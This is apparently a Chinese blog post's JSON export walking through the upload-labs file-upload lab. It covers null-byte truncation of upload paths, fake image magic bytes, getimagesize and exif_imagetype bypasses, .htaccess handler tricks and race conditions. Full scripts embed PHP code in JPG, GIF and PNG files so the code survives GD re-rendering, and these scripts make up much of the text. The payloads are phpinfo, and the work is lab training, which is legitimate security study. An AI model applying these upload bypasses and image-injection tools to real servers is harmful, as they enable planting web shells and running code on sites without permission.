√\n可上传png、gif、jpg\t\t√\n```\n\n**PHP版本低于5.3.29，且GPC关闭**下是可以突破的\n\n![011_1](/img/fileupload/upload-labs/011_1.png)\n\n![011_2](/img/fileupload/upload-labs/011_2.png)\n\n查看源码\n\n![011_3](/img/fileupload/upload-labs/011_3.png)\n\n问题的根源是上传的路径是用户可控的,当上传的路径为`save_path=../upload/yyg.php%00`后还会进行拼接,在接下来移动文件的时候经过`%00`截断后保留文件为`yyg.php`.\n\n![011_4](/img/fileupload/upload-labs/011_4.png)\n\n用户能够控制上传路径是十分危险的。\n\n## 0x12\n\n### 0x00截断绕过白名单\n\n应该还是白名单,测试下先\n\n```\n双写后缀\t\t×\n可上传png、gif、jpg\t\t√\n文件上传被改名，后缀保留\t\t√ \n特殊后缀名\t\t×\n\n```\n\n**PHP版本低于5.3.29，且GPC关闭**下是可以突破的\n\n用burp抓包发现可以控制`save_path`,和get方式不同,POST方式利用0x00截断\n\n![012_1](/img/fileupload/upload-labs/012_1.png)\n\n选中%00，用快捷键`ctrl+shift+u`后Go\n\n![012_2](/img/fileupload/upload-labs/012_2.png)\n\n成了\n\n![012_3](/img/fileupload/upload-labs/012_3.png)\n\n也可以用这种方式\n\n![012_4](/img/fileupload/upload-labs/012_4.png)\n\n![012_5](/img/fileupload/upload-labs/012_5.png)\n\n![012_6](/img/fileupload/upload-labs/012_6.png)\n\n查看源码\n\n![012_7](/img/fileupload/upload-labs/012_7.png)\n\n可以看到与Pass-11只是用了POST方式\n\n截断利用条件\n\n1. php版本小于`5.3.29` `。\n2. php的`magic_quotes_gpc`为OFF状态。\n3. 拼接点在`url`处即`get`使用`%00`\n4. 拼接点在`post`处使用`0x00`\n\n## 0x13\n\n### 绕过二进制文件前两位ASCII检测\n\n![013_1](/img/fileupload/upload-labs/013_1.png)\n\n这一课需求变了,要求上传图片马,简单测试发现是白名单,会拼接图片后缀。上传图片马后还需要文件包含漏洞才行,但是作者提供的环境有没有文件包含。自己写一份本地验证。\n\n```\n#includes.php 放在upload-labs根路径\n<?php\n\terror_reporting(0);\n\tif ($_GET['file']) {\n\t\t$file = $_GET['file'];\n\t\tinclude $file;\n\t} else {\n\t\tinclude 'index.php';\n\t}\n?>\n```\n\nburp抓包修改上传的gif文件,末尾插入phpinfo。png和jpg都能用这种方法。\n\n![013_2](/img/fileupload/upload-labs/013_2.png)\n\n![013_3](/img/fileupload/upload-labs/013_3.png)\n\n查看源码后发现考点在文件头幻数检测。\n\n![013_4](/img/fileupload/upload-labs/013_4.png)\n\nJPG\n\n```\n#16进制\nFF D8 FF E0 00 10 4A 46 49 46\n```\n\nGIF\n\n```\n#16进制\n47 49 46 38 39 61\n```\n\n(相当于文本的GIF89a,一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符。）\n\nPNG\n\n```\n#16进制\n89 50 4E 47\n```\n\n上传一个没有内容的空文件。\n\n![013_5](/img/fileupload/upload-labs/013_5.png)\n\nGIF用自己添加的文件包含php验证\n\n![013_6](/img/fileupload/upload-labs/013_6.png)\n\nPNG:\n\n可以用`ctrl+shift+u`快捷键将`%89`直接转hex\n\n![013_7](/img/fileupload/upload-labs/013_7.png)\n\nJPG:\n\n可以用`ctrl+shift+u`快捷键将`%FF%D8%FF%E0%00%10%4A%46%49%46`\n\n![013_8](/img/fileupload/upload-labs/013_8.png)\n\n## 0x14\n\n### 突破getimagesize()\n\n尝试了下用Pass-13的方法依然能上传图片马.png和jpg一样.\n\n![014_1](/img/fileupload/upload-labs/014_1.png)\n\n查看源码\n\n![014_2](/img/fileupload/upload-labs/014_2.png)\n\n这里是利用getimages函数来获取图片的宽高信息的,如果上传的不是图片,那就获取不到信息.\n\n依旧可以利用补充对应的图片文件头绕过.\n\npng:\n\npng有些特殊,光给文件头还不行,需指定文件大小。把下面这段\n\n`%89%50%4E%47%0D%0A%1A%0A%00%00%00%0D%49%48%44%52`\n\n带入\n\n![014_3](/img/fileupload/upload-labs/014_3.png)\n\n选中后用`ctrl+shift+u`快捷键。\n\n![014_4](/img/fileupload/upload-labs/014_4.png)\n\n![014_5](/img/fileupload/upload-labs/014_5.png)\n\njpg:\n\n测试失败,即使是上传正常的jpg也被拒绝。\n\n## 0x15\n\n### 突破exif_imagetype()\n\ngif:\n\n![015_1](/img/fileupload/upload-labs/015_1.png)\n\npng:``%89%50%4E%47%0D%0A%1A%0A%00%00%00%0D%49%48%44%52``\n\n![015_2](/img/fileupload/upload-labs/015_2.png)\n\njpg:`%FF%D8%FF%E0%00%10%4A%46%49%46`\n\n![015_3](/img/fileupload/upload-labs/015_3.png)\n\n源码:\n\n![015_4](/img/fileupload/upload-labs/015_4.png)\n\n## 0x16\n\n### 二次渲染\n\n二次渲染相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了\n\n之前的招数不管用了,这次文件上传的图片经过了二次渲染。其中的代表`imagecreatefromjpeg`函数。\n\n通过查询MD5值可以看到.\n\n```\nwindows下cmd查看MD5:certutil -hashfile \"filename\" MD5\nlinux:md5sum \"filename\"\n```\n\n![016_1](/img/fileupload/upload-labs/016_1.png)\n\n尝试了把phpinfo插入到文件的末尾,但是渲染的时候明显取不到这个位置。\n\n### jpg:\n\n可以通过毛子写的脚本生成一个二次渲染后依旧能保留payload的图片上传。\n\n利用方式,先上传jpg图片后,再把经过渲染的图片下到本地,通过\n\n`php jpg_payload.php 1.jpg`命令生成payload图片。\n\n![016_2](/img/fileupload/upload-labs/016_2.png)\n\n#### 脚本\n\n```\n<?php\n\t/*\n\n\tThe algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().\n\tIt is necessary that the size and quality of the initial image are the same as those of the processed image.\n\n\t1) Upload an arbitrary image via secured files upload script\n\t2) Save the processed image and launch:\n\tjpg_payload.php <jpg_name.jpg>\n\n\tIn case of successful injection you will get a specially crafted image, which should be uploaded again.\n\n\tSince the most straightforward injection method is used, the following problems can occur:\n\t1) After the second processing the injected data may become partially corrupted.\n\t2) The jpg_payload.php script outputs \"Something's wrong\".\n\tIf this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.\n\n\tSergey Bobrov @Black2Fan.\n\n\tSee also:\n\thttps://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/\n\n\t*/\n\n\t$miniPayload = \"<?php phpinfo();?>\";\n\n\n\tif(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {\n    \tdie('php-gd is not installed');\n\t}\n\t\n\tif(!isset($argv[1])) {\n\t\tdie('php jpg_payload.php <jpg_name.jpg>');\n\t}\n\n\tset_error_handler(\"custom_error_handler\");\n\n\tfor($pad = 0; $pad < 1024; $pad++) {\n\t\t$nullbytePayloadSize = $pad;\n\t\t$dis = new DataInputStream($argv[1]);\n\t\t$outStream = file_get_contents($argv[1]);\n\t\t$extraBytes = 0;\n\t\t$correctImage = TRUE;\n\n\t\tif($dis->readShort() != 0xFFD8) {\n\t\t\tdie('Incorrect SOI marker');\n\t\t}\n\n\t\twhile((!$dis->eof()) && ($dis->readByte() == 0xFF)) {\n\t\t\t$marker = $dis->readByte();\n\t\t\t$size = $dis->readShort() - 2;\n\t\t\t$dis->skip($size);\n\t\t\tif($marker === 0xDA) {\n\t\t\t\t$startPos = $dis->seek();\n\t\t\t\t$outStreamTmp = \n\t\t\t\t\tsubstr($outStream, 0, $startPos) . \n\t\t\t\t\t$miniPayload . \n\t\t\t\t\tstr_repeat(\"\\0\",$nullbytePayloadSize) . \n\t\t\t\t\tsubstr($outStream, $startPos);\n\t\t\t\tcheckImage('_'.$argv[1], $outStreamTmp, TRUE);\n\t\t\t\tif($extraBytes !== 0) {\n\t\t\t\t\twhile((!$dis->eof())) {\n\t\t\t\t\t\tif($dis->readByte() === 0xFF) {\n\t\t\t\t\t\t\tif($dis->readByte !== 0x00) {\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$stopPos = $dis->seek() - 2;\n\t\t\t\t\t$imageStreamSize = $stopPos - $startPos;\n\t\t\t\t\t$outStream = \n\t\t\t\t\t\tsubstr($outStream, 0, $startPos) . \n\t\t\t\t\t\t$miniPayload . \n\t\t\t\t\t\tsubstr(\n\t\t\t\t\t\t\tstr_repeat(\"\\0\",$nullbytePayloadSize).\n\t\t\t\t\t\t\t\tsubstr($outStream, $startPos, $imageStreamSize),\n\t\t\t\t\t\t\t0,\n\t\t\t\t\t\t\t$nullbytePayloadSize+$imageStreamSize-$extraBytes) . \n\t\t\t\t\t\t\t\tsubstr($outStream, $stopPos);\n\t\t\t\t} elseif($correctImage) {\n\t\t\t\t\t$outStream = $outStreamTmp;\n\t\t\t\t} else {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tif(checkImage('payload_'.$argv[1], $outStream)) {\n\t\t\t\t\tdie('Success!');\n\t\t\t\t} else {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tunlink('payload_'.$argv[1]);\n\tdie('Something\\'s wrong');\n\n\tfunction checkImage($filename, $data, $unlink = FALSE) {\n\t\tglobal $correctImage;\n\t\tfile_put_contents($filename, $data);\n\t\t$correctImage = TRUE;\n\t\timagecreatefromjpeg($filename);\n\t\tif($unlink)\n\t\t\tunlink($filename);\n\t\treturn $correctImage;\n\t}\n\n\tfunction custom_error_handler($errno, $errstr, $errfile, $errline) {\n\t\tglobal $extraBytes, $correctImage;\n\t\t$correctImage = FALSE;\n\t\tif(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) {\n\t\t\tif(isset($m[1])) {\n\t\t\t\t$extraBytes = (int)$m[1];\n\t\t\t}\n\t\t}\n\t}\n\n\tclass DataInputStream {\n\t\tprivate $binData;\n\t\tprivate $order;\n\t\tprivate $size;\n\n\t\tpublic function __construct($filename, $order = false, $fromString = false) {\n\t\t\t$this->binData = '';\n\t\t\t$this->order = $order;\n\t\t\tif(!$fromString) {\n\t\t\t\tif(!file_exists($filename) || !is_file($filename))\n\t\t\t\t\tdie('File not exists ['.$filename.']');\n\t\t\t\t$this->binData = file_get_contents($filename);\n\t\t\t} else {\n\t\t\t\t$this->binData = $filename;\n\t\t\t}\n\t\t\t$this->size = strlen($this->binData);\n\t\t}\n\n\t\tpublic function seek() {\n\t\t\treturn ($this->size - strlen($this->binData));\n\t\t}\n\n\t\tpublic function skip($skip) {\n\t\t\t$this->binData = substr($this->binData, $skip);\n\t\t}\n\n\t\tpublic function readByte() {\n\t\t\tif($this->eof()) {\n\t\t\t\tdie('End Of File');\n\t\t\t}\n\t\t\t$byte = substr($this->binData, 0, 1);\n\t\t\t$this->binData = substr($this->binData, 1);\n\t\t\treturn ord($byte);\n\t\t}\n\n\t\tpublic function readShort() {\n\t\t\tif(strlen($this->binData) < 2) {\n\t\t\t\tdie('End Of File');\n\t\t\t}\n\t\t\t$short = substr($this->binData, 0, 2);\n\t\t\t$this->binData = substr($this->binData, 2);\n\t\t\tif($this->order) {\n\t\t\t\t$short = (ord($short[1]) << 8) + ord($short[0]);\n\t\t\t} else {\n\t\t\t\t$short = (ord($short[0]) << 8) + ord($short[1]);\n\t\t\t}\n\t\t\treturn $short;\n\t\t}\n\n\t\tpublic function eof() {\n\t\t\treturn !$this->binData||(strlen($this->binData) === 0);\n\t\t}\n\t}\n?>\n\n```\n\n![016_3](/img/fileupload/upload-labs/016_3.png)\n\n### gif:\n\n可以通过对比gif图删剪部分,可以尝试把payload插入到未修改部分。这里也有脚本帮助啊。\n\n`https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE`\n\n#### 脚本\n\n```\n<?php\n/**\n * Author: rickchen.vip(at)gmail.com\n * Date: 2015-04-05\n * Desc: Use Similar-Block-Attack to bypass PHP-GD process to RCE\n * Reference: http://www.secgeek.net/bookfresh-vulnerability/\n * Usage: php codeinj.php demo.gif \"<?php phpinfo();?>\"\n */\n\n\nfunction gd_process($src_img, $dst_img) {\n    try {\n        # you can redefine the GD process\n        $im = imagecreatefromgif($src_img);\n        imagegif($im, $dst_img);\n    } catch (Exception $e) {\n        printf(\"%s\\n\", $e->getMessage());\n        return false;\n    }\n\n    return true;\n}\n\n\nfunction find_similar_block($src_img, $dst_img, $block_len, $slow=false) {\n    $src_data = fread(fopen($src_img, \"rb\"), filesize($src_img));\n    $dst_data = fread(fopen($dst_img, \"rb\"), filesize($dst_img));\n    $src_index = 0;\n    $pre_match_array = array();\n\n    while ($src_index < (strlen($src_data) - $block_len)) {\n        $find_data = substr($src_data, $src_index, $block_len);\n\n        $dst_index = 0;\n        $found = false;\n        while ($dst_index < (strlen($dst_data) - $block_len)) {\n            $temp_data = substr($dst_data, $dst_index, $block_len);\n            if (0 === strcmp($find_data, $temp_data)) {\n                $match = array(\n                    \"src_offset\" => $src_index,\n                    \"dst_offset\" => $dst_index\n                );\n                $pre_match_array[] = $match;\n                $found = true;\n\n                /*\n                printf(\"Similar block found> src_offset: %d\\n\", $src_index);\n                printf(\"                     dst_offset: %d\\n\", $dst_index);\n                printf(\"                   similar_data: %s\\n\", str2hex($temp_data));\n                printf(\"                 similar_length: %s\\n\\n\", strlen($temp_data));\n                */\n            }\n            if ($found && $slow == false)\n                $dst_index += $block_len;\n            else\n                $dst_index++;\n        }\n\n        if ($found && $slow == false)\n            $src_index += $block_len;\n        else\n            $src_index++;\n    }\n\n    return $pre_match_array;\n}\n\n\nfunction inject_code_to_src_img($src_img, $pre_match_array, $injection_code) {\n    $src_data = fread(fopen($src_img, \"rb\"), filesize($src_img));\n    $inj_len = strlen($injection_code);\n\n    $find_n = 0;\n    foreach ($pre_match_array as $similar_block) {\n        #printf(\"Trying inject code to source image with offset: %d, length: %d\\n\", $similar_block[\"src_offset\"], $inj_len);\n        $mod_src_data = substr($src_data, 0, $similar_block[\"src_offset\"]).$injection_code.substr($src_data, $similar_block[\"src_offset\"] + $inj_len);\n        $temp_img = sys_get_temp_dir().\"/\".$src_img.\".mod\";\n        $temp_cvt_img = $temp_img.\".gd\";\n        fwrite(fopen($temp_img, \"wb\"), $mod_src_data);\n\n        if (!gd_process($temp_img, $temp_cvt_img)) {\n            #printf(\"PHP-GD process() the image modified error, offset: %d\\n\", $similar_block[\"src_offset\"]);\n            #printf(\"                                           length: %d\\n\\n\", $inj_len);\n            continue;\n        } else {\n            if (check_code($temp_cvt_img, $injection_code)) {\n                $fuck_img = \"gd_\".$src_img;\n                fwrite(fopen($fuck_img, \"wb\"), $mod_src_data);\n                printf(\"Inject code to source image successful with offset: %d\\n\", $similar_block[\"src_offset\"]);\n                printf(\"Saving result \\\"%s\\\", have fun! :)\\n\", $fuck_img);\n                exit;\n            } else {\n                continue;\n                #printf(\"Modified image doesn't work well, offset: %d, retry...\\n\", $similar_block[\"src_offset\"]);\n            }\n        }\n    }\n}\n\n\nfunction check_code($src_img, $injection_code) {\n    $data = fread(fopen($src_img, \"rb\"), filesize($src_img));\n\n    return strpos($data, $injection_code);\n}\n\n\nfunction str2hex($str){\n    $hex = \"\";\n    for ($i = 0; $i < strlen($str); $i++){\n        $hex .= sprintf(\"%02x\", (ord($str[$i])));;\n    }\n\n    return $hex;\n}\n\n\nfunction hex2str($hex){\n    $str = \"\";\n    for ($i = 0; $i < strlen($hex)-1; $i+=2){\n        $str .= chr(hexdec($hex[$i].$hex[$i+1]));\n    }\n\n    return $str;\n}\n\n\n/* main */\nif ($argc < 3) {\n    printf(\"Usage: php %s <src_img> <inj_code>\\n\", $argv[0]);\n    exit;\n}\n\n$slow = false;\n$src_img = $argv[1];\n$injection_code = $argv[2];\n\n$img_info = getimagesize($src_img);\n\n/* GIF image type value \"1\" */\nif ($img_info[2] == '1') {\n    $cvt_img = sys_get_temp_dir().\"/\".basename($src_img);\n    if (!gd_process($src_img, $cvt_img)) {\n        printf(\"PHP-GD process() function error, please check out.\\n\");\n        exit;\n    }\n} else {\n    printf(\"This script only support GIF image.\\n\");\n    exit;\n}\n\n$block_len = strlen($injection_code);\n$pre_match_array = find_similar_block($src_img, $cvt_img, $block_len, $slow);\n\nif (sizeof($pre_match_array)) {\n    inject_code_to_src_img($src_img, $pre_match_array, $injection_code);\n} else {\n    printf(\"Not found any similar %d bytes block.\\n\", strlen($injection_code));\n}\n\nprintf(\"Cant find any useful similar block to inject code, but take it easy. :(\\n\");\n\n```\n\n用其自带的`demo.gif`,我这里一次就成功了,不行的话多尝试下换一张图片或者尝试其他payload。\n\n![016_4](/img/fileupload/upload-labs/016_4.png)\n\n![016_5](/img/fileupload/upload-labs/016_5.png)\n\n### png:\n\n`https://raw.githubusercontent.com/hxer/imagecreatefrom-/master/png/poc/poc_png.py`\n\n#### 脚本\n\n```\n# -*- coding: utf-8 -*-\n\n\"\"\"\nauthor: janes\n\"\"\"\n\nimport binascii\n\n\nclass PNGError(Exception):\n\n    def __init__(self, value):\n        self.value = value\n\n    def __str__(self):\n        return repr(self.value)\n\n\nclass PNG(object):\n    \"\"\"\n    read png file and modify png data to php code, just support index-color\n    images.\n    \"\"\"\n\n    def __init__(self, fname=None):\n        if fname:\n            self.openpng(fname)\n\n    def openpng(self, fname):\n        try:\n            with open(fname, 'rb') as f:\n                self.data = f.read()\n        except:\n            err_msg = \"open {f} failed\".format(f=fname)\n            raise PNGError(err_msg)\n            \n        self.read_info()\n\n    def read_info(self):\n        try:\n            self.signature = self.data[:8]\n            self.depth = self.data[0x18]\n            self.color_type = self.data[0x19]\n        except:\n            raise PNGError('invalid png data')\n\n        if not self.check_signature():\n            raise PNGError('check png signature error')\n        if not self.check_type():\n            raise PNGError('just support index-color images')\n        if not self.check_plte():\n            raise PNGError('check PLTE chunk error')\n\n        pos = self.data.find('PLTE')\n        self.plte_len = int(self.data[pos-4: pos].encode('hex'), 16)\n        self.plte_pos = pos-4\n\n    def check_signature(self):\n        return self.signature == '89504e470d0a1a0a'.decode('hex')\n\n    def check_type(self):\n        return self.color_type == '03'.decode('hex')\n\n    def check_plte(self):\n        return self.data.find('PLTE') != -1\n\n    def set_payload(self, payload):\n        \"\"\"\n        set php code payload\n        \"\"\"\n        code_len = len(payload)\n        if code_len > self.depth*3:\n            err_msg = \"payload is too long, can't to add to png PLTE chunk\"\n            raise PNGError(err_msg)\n        self.payload = payload\n\n    def check_payload(self):\n        return len(self.payload) <= self.plte_len\n\n    def crc(self, data):\n        return '%08x' % (binascii.crc32(data) & 0xffffffff)\n\n    def modify_plte(self):\n        if self.check_payload():\n            im = list(self.data)\n            payload_pos = self.plte_pos + 8\n            # modify data to php code\n            for i in range(len(self.payload)):\n                im[payload_pos+i] = self.payload[i]\n\n            crc_pos = self.plte_pos + 8 + self.plte_len\n            crc_checks = self.crc(''.join(im[self.plte_pos+4: crc_pos]))\n            crc_checks = crc_checks.decode('hex')\n            # modify crc\n            for i in range(4):\n                im[crc_pos+i] = crc_checks[i]\n            self.im = ''.join(im)\n        else:\n            code_len = len(self.payload)            # must be a multiple of 3\n            add_len = code_len % 3\n            if add_len:\n                add_len = 3 - add_len\n                \n            plte_len = ('%08x' % (code_len+add_len)).decode('hex')\n            plte_type = 'PLTE'\n            plte_data = self.payload + ' ' * add_len\n            plte_crc = self.crc(plte_type+plte_data).decode('hex')\n            plte_chunk = plte_len + plte_type + plte_data + plte_crc\n\n            im = self.data[:self.plte_pos]\n            im += plte_chunk\n            im += self.data[(self.plte_pos+12+self.plte_len):]\n            self.im = im\n\n    def save(self, imfile):\n        with open(imfile, 'wb') as f:\n            f.write(self.im)\n\nif __name__ == \"__main__\":\n    debug = 0\n    if debug:\n        info_code = '<?php phpinfo();?>'\n\n        php_code = info_code\n        php_png = 'php_long.png'\n        png_file = 'test.png'\n    else:\n        import argparse\n\n        parser = argparse.ArgumentParser()\n        parser.add_argument('in_file', help='input png file')\n        parser.add_argument('-p', dest='payload',\n                help='php code to add to PLTE chunk', required=True)\n        parser.add_argument('-o', dest=\"out_file\", default='php.png',\n                help='output png file, default is php.png')\n        args = parser.parse_args()\n\n        png_file = args.in_file\n        php_code = args.payload\n        php_png = args.out_file\n\n    try:\n        png = PNG()\n        png.openpng(png_file)\n        png.set_payload(php_code)\n        png.modify_plte()\n        png.save(php_png)\n    except PNGError as e:\n        print \"Error massage: {}\".format(e.value)\n\n```\n\n![016_6](/img/fileupload/upload-labs/016_6.png)\n\n![016_7](/img/fileupload/upload-labs/016_7.png)\n\n## 0x17\n\n### 条件竞争\n\n利用burp重复发包\n\n![017_2](/img/fileupload/upload-labs/017_2.png)\n\n![017_3](/img/fileupload/upload-labs/017_3.png)\n\n在运行时访问,如果不成功要调高线程数。\n\n![017_1](/img/fileupload/upload-labs/017_1.png)\n\n源码：\n\n![017_4](/img/fileupload/upload-labs/017_4.png)\n\n但是上述的方式太不稳定了,可以将上传文件的内容修改为\n\n```\n<?php fputs(fopen(\"info.php\", \"w\"), \"<?php phpinfo(); ?>\"); ?>\n```\n\n一旦访问成功就创建info.php文件。\n\n## 0x18\n\n### 条件竞争结合Apache解析漏洞\n\n尝试上传文件后猜测后台应该是白名单。\n\n![018_1](/img/fileupload/upload-labs/018_1.png)\n\n没有利用的思路,翻了别人的思路,需要Apache解析漏洞和条件竞争。\n\n![018_2](/img/fileupload/upload-labs/018_2.png)\n\n![018_3](/img/fileupload/upload-labs/018_3.png)\n\n## 0x19\n\n### 利用截断\n\n测试了一下,命名的文件直接拼接上去了。这部分是用户可以控制的,尝试一下截断。\n\n**PHP版本低于5.3.29，且GPC关闭**下突破成功\n\n![019_1](/img/fileupload/upload-labs/019_1.png)\n\n查看下源码\n\n源码:\n\n![019_2](/img/fileupload/upload-labs/019_2.png)\n\n## \n\n\n\n","slug":"upload-labs笔记","published":1,"updated":"2019-06-19T17:23:13.401Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istp900as4dsb8mige53p","content":"<h1 id=\"upload-labs笔记\"><a href=\"#upload-labs笔记\" class=\"headerlink\" title=\"upload-labs笔记\"></a>upload-labs笔记</h1><hr>\n<h2 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2><h3 id=\"前端绕过\"><a href=\"#前端绕过\" class=\"headerlink\" title=\"前端绕过\"></a>前端绕过</h3><p><img src=\"/img/fileupload/upload-labs/001.png\" alt=\"001\"></p>\n<p>文件在前端使用了js函数检测,绕过前端即可。</p>\n<p>使用firefox的插件NoScript直接关掉js.</p>\n<p><img src=\"/img/fileupload/upload-labs/001_1.png\" alt=\"001_1\"></p>\n<p><img src=\"/img/fileupload/upload-labs/001_2.png\" alt=\"001_2\"></p>\n<p><img src=\"/img/fileupload/upload-labs/001_3.png\" alt=\"001_3\"></p>\n<h2 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><h3 id=\"MIME绕过\"><a href=\"#MIME绕过\" class=\"headerlink\" title=\"MIME绕过\"></a>MIME绕过</h3><p>观察源码可以分析到只对文件的类型做了白名单检测,burp抓包后修改MIME文件类型即可成功上传。</p>\n<p><img src=\"/img/fileupload/upload-labs/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/fileupload/upload-labs/002_1.png\" alt=\"002_1\"></p>\n<p>这里有个坑啊,原来我修改的jpg格式竟然不行。</p>\n<p><img src=\"/img/fileupload/upload-labs/002_3.png\" alt=\"002_3\"></p>\n<h2 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><h3 id=\"特殊可解析文件绕过\"><a href=\"#特殊可解析文件绕过\" class=\"headerlink\" title=\"特殊可解析文件绕过\"></a>特殊可解析文件绕过</h3><p>尝试直接上传php文件,不予许上传,估计应用了黑名单。</p>\n<p><img src=\"/img/fileupload/upload-labs/003.png\" alt=\"003\"></p>\n<p>尝试php1,发现能上传</p>\n<p><img src=\"/img/fileupload/upload-labs/003_1.png\" alt=\"003_1\"></p>\n<p>由于没有配置其他php文件后缀,这个思路也不行。</p>\n<p>如果Apache的配置文件可以匹配php5的其他配置文件,那这里的黑名单就没有过滤。</p>\n<p><img src=\"/img/fileupload/upload-labs/003_2.png\" alt=\"003_2\"></p>\n<p>Apache和php常用的php程序文件后缀有phtml、pht、php3、php4和php5。</p>\n<p>这里还暂时没有其他思路。</p>\n<h2 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h2><p>黑名单检测。可以上传的文件gif ,png, jpeg;大小写无效;</p>\n<p><img src=\"/img/fileupload/upload-labs/004_0.png\" alt=\"004_0\"></p>\n<h3 id=\"Apache解析漏洞\"><a href=\"#Apache解析漏洞\" class=\"headerlink\" title=\"Apache解析漏洞\"></a>Apache解析漏洞</h3><p><img src=\"/img/fileupload/upload-labs/004.png\" alt=\"004\"></p>\n<h3 id=\"htaccess重写文件解析规则绕过\"><a href=\"#htaccess重写文件解析规则绕过\" class=\"headerlink\" title=\".htaccess重写文件解析规则绕过\"></a>.htaccess重写文件解析规则绕过</h3><p>上传先上传一个名为<code>.htaccess</code>文件，内容如下：</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">&lt;FilesMatch \"04.png\"&gt;</span></span><br><span class=\"line\"><span class=\"attribute\"><span class=\"nomarkup\">SetHandler</span></span> application/x-httpd-php</span><br><span class=\"line\"><span class=\"section\">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/fileupload/upload-labs/004_1.png\" alt=\"004_1\"></p>\n<p>再上传04.png的文件</p>\n<p><img src=\"/img/fileupload/upload-labs/004_2.png\" alt=\"004_2\"></p>\n<p>产生重写文件解析规则绕过绕过的原因是httpd.conf文件中的两处配置文件的原因和过滤不严。</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#允许重写覆盖相关配置</span></span><br><span class=\"line\"><span class=\"attribute\">AllowOverride</span> <span class=\"literal\">All</span> </span><br><span class=\"line\"><span class=\"attribute\"><span class=\"nomarkup\">LoadModule</span></span> rewrite_module modules/mod_rewrite.so</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"PHP-和-Windows环境的叠加特性\"><a href=\"#PHP-和-Windows环境的叠加特性\" class=\"headerlink\" title=\"PHP 和 Windows环境的叠加特性\"></a>PHP 和 Windows环境的叠加特性</h3><p>分析文章：<code>https://www.ctolib.com/topics-88860.html</code></p>\n<p><code>:截断</code>产生空文件</p>\n<p><img src=\"/img/fileupload/upload-labs/004_3.png\" alt=\"004\"></p>\n<p>然后将文件名改为<code>04.&lt;</code>或<code>04.&lt;&lt;&lt;</code>或<code>04.&gt;&gt;&gt;</code>或<code>04.&gt;&gt;&lt;</code>后再次上传，重写<code>4.php</code>文件内容，Webshell代码就会写入原来的<code>04.php</code>空文件中。</p>\n<p><img src=\"/img/fileupload/upload-labs/004_4.png\" alt=\"004\"></p>\n<h2 id=\"0x05\"><a href=\"#0x05\" class=\"headerlink\" title=\"0x05\"></a>0x05</h2><h3 id=\"大小写绕过\"><a href=\"#大小写绕过\" class=\"headerlink\" title=\"大小写绕过\"></a>大小写绕过</h3><p>黑盒测试发现是黑名单过滤</p>\n<figure class=\"highlight autohotkey\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">特殊可解析后缀 ×</span><br><span class=\"line\">上传`.htaccess`×</span><br><span class=\"line\">点绕过 × </span><br><span class=\"line\">windows流绕过 ×</span><br></pre></td></tr></table></figure>\n\n<p>最后发现后缀大小写能绕过</p>\n<p><img src=\"/img/fileupload/upload-labs/005_1.png\" alt=\"005_1\"></p>\n<p>可以查看源码看看还有什么可以绕过。</p>\n<p><img src=\"/img/fileupload/upload-labs/005_2.png\" alt=\"005_2\"></p>\n<h2 id=\"0x06\"><a href=\"#0x06\" class=\"headerlink\" title=\"0x06\"></a>0x06</h2><h3 id=\"空格绕过\"><a href=\"#空格绕过\" class=\"headerlink\" title=\"空格绕过\"></a>空格绕过</h3><p>黑盒测试发现是黑名单过滤</p>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">上传后重命名文件 √</span><br><span class=\"line\">后缀大小写 ×</span><br><span class=\"line\">特殊可解析后缀 ×</span><br><span class=\"line\">::<span class=\"variable\">$DATA</span>绕过 ×</span><br><span class=\"line\">空格绕过 √</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/fileupload/upload-labs/006_1.png\" alt=\"006_1\"></p>\n<p>查看下源码</p>\n<p><img src=\"/img/fileupload/upload-labs/006_2.png\" alt=\"006_2\"></p>\n<h2 id=\"0x07\"><a href=\"#0x07\" class=\"headerlink\" title=\"0x07\"></a>0x07</h2><h3 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\".绕过\"></a>.绕过</h3><figure class=\"highlight smali\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span 